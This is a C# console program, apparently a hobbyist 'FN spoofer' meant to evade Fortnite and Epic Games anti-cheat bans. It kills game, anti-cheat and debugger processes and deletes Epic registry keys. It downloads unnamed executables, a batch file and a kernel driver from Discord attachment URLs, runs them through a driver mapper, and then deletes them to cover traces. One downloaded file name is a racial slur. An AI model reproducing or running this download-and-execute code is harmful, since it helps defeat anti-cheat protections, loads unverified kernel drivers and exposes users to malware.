using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Net;
using System.Diagnostics;
using System.Security.Principal;

namespace Spoofer_menu_test
{
    class Print
    {
        //CLEANER IS UPDATED - 1/19/2023
        private static string SIDCleaner = WindowsIdentity.GetCurrent().User.Value;

        public static void Cleantraces()
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            process.StandardInput.WriteLine("");
            process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
            process.StandardInput.WriteLine("taskkill /f /im EpicWebHelper.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
            process.StandardInput.WriteLine("taskkill /f /im EpicGamesLauncher.exe");
            process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
            process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
            process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
            process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
            process.StandardInput.WriteLine("taskkill /f /im x64dbg.exe");
            process.StandardInput.WriteLine("taskkill /f /im x32dbg.exe");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\" + SIDCleaner + "\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("exit");
            CleanTraces2();
        }
        public static void CleanTraces2()
        {
            using (System.Diagnostics.Process proc = new System.Diagnostics.Process())
            {
                WebClient web = new WebClient();
                string cleaner34 = @"C:\Windows\cleaner34.exe";
                web.DownloadFile("https://cdn.discordapp.com/attachments/1046596934493814884/1065659417309225090/cleaner34.exe", cleaner34);
                proc.StartInfo.UseShellExecute = false;
                Process.Start(cleaner34);
                proc.WaitForExit();
                Thread.Sleep(2000);
                File.Delete(cleaner34);
                Thread.Sleep(2000);
            }
        }
         static public void Clean()
         {
            Thread.Sleep(1000);
            Console.Clear();

            Console.WriteLine("Cleaning...");

            Thread.Sleep(1000);
            Cleantraces();
            Thread.Sleep(5000);


            Console.WriteLine("Done !!");
        }
        static public void prints()
        {
            /*colour list
                Console.ForegroundColor = ConsoleColor.DarkBlue;
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.ForegroundColor = ConsoleColor.Green;
                Console.ForegroundColor = ConsoleColor.Gray;
                */
            //Remove colour Console.ResetColor();

            Thread.Sleep(1000);
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Simpy Coded A FN Spoofer");
            Console.WriteLine("");

            Console.ResetColor();
            Console.WriteLine("Spoof [1]");
            Console.WriteLine("");
            Console.WriteLine("Clean [2]");
            Console.WriteLine("");
            Console.WriteLine("Serials [3]");
            Console.WriteLine("");

            Console.WriteLine("Option:");
        }
    }
    class Program
    {
        static void Main(string[] args)
        {
            WebClient web = new WebClient();
            Process process = new Process();


            Thread.Sleep(1000);
            Print.prints();

            var menu = Console.ReadLine();

            if (menu == "1")
            {
                Console.Clear();
                Thread.Sleep(2000);

                Console.WriteLine("[!] Spoofing Bios");

                //BIOS Spoofer
                string Bios = @"C:\Windows\IME\Bios.exe";
                web.DownloadFile("https://cdn.discordapp.com/attachments/1046596934493814884/1065659296001560647/bios_spoofer.exe", Bios);
                process.StartInfo.UseShellExecute = false;
                process = Process.Start(Bios);
                process.WaitForExit();
                Thread.Sleep(5000);
                File.Delete(Bios);
                Thread.Sleep(2000);

                Console.WriteLine("[!] Spoofing Volume");
                Thread.Sleep(1100);
                Console.WriteLine("[!] Spoofing SMBIOS");
                Thread.Sleep(200);
                Console.WriteLine("[!] Spoofing GPU");
                Thread.Sleep(630);
                Console.WriteLine("[!] Spoofing Mac Adress");
                //Mac spoofer
                string Mac = @"C:\Windows\IME\Mac.bat";
                web.DownloadFile("https://cdn.discordapp.com/attachments/1046596934493814884/1065660454359289946/mac.exe", Mac);
                process.StartInfo.UseShellExecute = false;
                process = Process.Start(Mac);
                process.WaitForExit();
                Thread.Sleep(5000);
                File.Delete(Mac);
                Thread.Sleep(2000);

                // Main spoofer driver load.

                Thread.Sleep(1000);
                // Invade.cc drivers (i think there ud, i got no clue)
                string map = @"C:\Windows\IME\mapper.exe";
                string sys = @"C:\Windows\IME\spoof.sys";
                web.DownloadFile("https://cdn.discordapp.com/attachments/1058999215579213907/1059943644611751937/nigger.sys", sys);
                web.DownloadFile("https://cdn.discordapp.com/attachments/1038666067121283154/1059601884593262714/93cnasbnaa.exe", map);
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
                process = Process.Start(map, sys);
                Thread.Sleep(1000);
                process.Close();
                File.Delete(sys);
                File.Delete(map);
                Thread.Sleep(2000);

                Console.WriteLine("Spoofed successfully");

                Print.prints();
            }
            else
            {
                Print.prints();
            }

            if (menu == "2")
            {

                Console.Clear();
                Thread.Sleep(1000);

                Print.Clean();
                Console.WriteLine("Cleaned successfully");

                Print.prints();
            }
            else
            {
                Print.prints();
            }
            if (menu =="3")
            {
                Console.Clear();
                string checker = @"C:\Windows\IME\checker.bat";
                web.DownloadFile("https://cdn.discordapp.com/attachments/1046596934493814884/1065665748783083600/checker.bat", checker);
                process.StartInfo.UseShellExecute = false;
                process = Process.Start(checker);
                process.WaitForExit();
                Thread.Sleep(500);
                File.Delete(checker);
                Thread.Sleep(500);
            }
        }
    }
}
